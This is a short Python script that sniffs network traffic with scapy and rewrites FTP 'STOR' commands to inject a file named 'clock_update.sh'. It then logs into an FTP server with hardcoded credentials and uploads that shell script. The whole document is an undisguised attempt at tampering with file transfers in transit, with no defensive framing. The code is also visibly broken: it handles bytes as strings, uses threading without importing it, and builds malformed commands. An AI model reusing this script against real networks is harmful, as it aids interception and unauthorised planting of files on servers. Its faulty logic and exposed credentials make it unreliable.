from scapy.all import *
from ftplib import FTP

def handle_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        tcp_packet = packet[TCP]
        payload = packet[Raw].load

        # Check if the packet is an FTP command
        if tcp_packet.dport == 21 or tcp_packet.sport == 21:
            if payload.startswith('STOR'):
                # Modify the outgoing file
                new_file = 'clock_update.sh'
                payload = payload.replace('STOR', f'STOR {new_file}')
                packet[Raw].load = payload

                send(packet)

def sniff_packets():
    sniff(filter='tcp', prn=handle_packet)

sniff_thread = threading.Thread(target=sniff_packets)
sniff_thread.start()

ftp = FTP('ftp.yolo.co.il')
ftp.login('ftp_yolo','CyberSec@12')

file_path = '/home/dexter/clock_update.sh'
with open(file_path, 'rb') as file:
    ftp.storbinary(f'STOR clock_update.sh', file)

sniff_thread.join()
